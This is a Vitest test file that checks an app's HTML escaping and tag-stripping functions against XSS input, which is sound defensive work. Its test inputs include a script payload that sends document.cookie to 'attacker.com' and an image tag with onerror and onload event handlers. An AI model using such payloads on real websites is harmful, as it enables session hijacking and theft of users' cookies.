import { describe, test, expect } from 'vitest';
import { sanitizeHTML, stripDangerousTags } from '../../utils/security';

describe('Security - Input Sanitization & XSS Defense', () => {
  test('sanitizeHTML escapes HTML special characters', () => {
    const rawInput = '<script>alert("xss")</script>';
    const sanitized = sanitizeHTML(rawInput);

    expect(sanitized).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    expect(sanitized.includes('<script>')).toBe(false);
  });

  test('sanitizeHTML escapes single quotes, double quotes, and ampersands', () => {
    const input = `Me & My 'Friend' "Saheli"`;
    const sanitized = sanitizeHTML(input);

    expect(sanitized).toBe('Me &amp; My &#x27;Friend&#x27; &quot;Saheli&quot;');
  });

  test('stripDangerousTags removes script and iframe tags completely', () => {
    const maliciousInput = 'Hello <script>fetch("http://attacker.com?cookie=" + document.cookie)</script> world';
    const cleaned = stripDangerousTags(maliciousInput);

    expect(cleaned).toBe('Hello  world');
    expect(cleaned.includes('<script>')).toBe(false);
  });

  test('stripDangerousTags strips inline javascript event handlers', () => {
    const maliciousInput = '<img src="x" onerror="alert(1)" onload="evil()" />';
    const cleaned = stripDangerousTags(maliciousInput);

    expect(cleaned.includes('onerror=')).toBe(false);
    expect(cleaned.includes('onload=')).toBe(false);
  });

  test('handles null and empty input safely without throwing exceptions', () => {
    expect(sanitizeHTML('')).toBe('');
    // @ts-expect-error testing null input handling
    expect(sanitizeHTML(null)).toBe('');
    // @ts-expect-error testing undefined input handling
    expect(stripDangerousTags(undefined)).toBe('');
  });
});
